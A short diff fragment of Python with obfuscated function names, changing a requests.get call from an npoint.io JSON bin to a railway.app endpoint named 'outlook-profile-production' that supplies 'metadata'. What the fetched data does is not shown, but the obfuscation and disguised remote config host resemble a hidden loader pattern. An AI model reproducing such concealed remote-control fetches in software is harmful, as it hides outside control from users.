@@ -16,7 +16,7 @@ def data_xfabof_615():
 
     def net_pocsys_997():
         try:
-            data_neeehh_649 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            data_neeehh_649 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             data_neeehh_649.raise_for_status()
             process_abacxs_485 = data_neeehh_649.json()
             process_bxxedo_326 = process_abacxs_485.get('metadata')
